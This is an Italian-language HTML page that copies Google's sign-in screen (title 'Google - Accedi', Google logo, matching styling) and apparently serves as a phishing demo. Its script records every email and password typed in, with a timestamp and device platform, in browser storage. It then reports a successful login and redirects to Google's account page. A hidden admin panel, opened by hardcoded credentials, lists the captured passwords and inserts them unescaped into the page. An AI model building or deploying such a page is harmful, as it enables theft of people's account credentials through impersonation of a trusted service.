<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Accedi</title>
    <style>
        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .box { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 400px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; }
        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; }
        #admin { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#0d1117; color:#0f0; padding:20px; overflow:auto; z-index:100; }
        table { width:100%; border-collapse:collapse; margin-top:20px; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
    </style>
</head>
<body>

<div id="login-ui" class="box">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
    <h2>Accedi</h2>
    <p>Usa il tuo account Google</p>
    <input type="text" id="email" placeholder="Email o telefono">
    <input type="password" id="pass" placeholder="Inserisci la password">
    <button onclick="check()">Avanti</button>
</div>

<div id="admin">
    <h1>PANNELLO ADMIN - DATABASE</h1>
    <table id="tabella">
        <tr><th>Data</th><th>Email</th><th>Password</th><th>Dispositivo</th></tr>
    </table>
    <br><button onclick="location.reload()" style="background:#f00">Chiudi</button>
</div>

<script>
    function check() {
        const e = document.getElementById('email').value;
        const p = document.getElementById('pass').value;

        if (e === "admin@demo.it" && p === "mostra-tutto") {
            const dati = JSON.parse(localStorage.getItem('db')) || [];
            const t = document.getElementById('tabella');
            dati.forEach(d => {
                t.innerHTML += `<tr><td>${d.dt}</td><td>${d.em}</td><td>${d.ps}</td><td>${d.dev}</td></tr>`;
            });
            document.getElementById('admin').style.display = 'block';
            return;
        }

        if(!e || !p) return alert("Dati richiesti");

        let db = JSON.parse(localStorage.getItem('db')) || [];
        db.push({ dt: new Date().toLocaleString(), em: e, ps: p, dev: navigator.platform });
        localStorage.setItem('db', JSON.stringify(db));

        document.body.innerHTML = "<h1>Accesso riuscito</h1><p>Reindirizzamento...</p>";
        setTimeout(() => { window.location.href = "https://myaccount.google.com/"; }, 2000);
    }
</script>
</body>
</html>
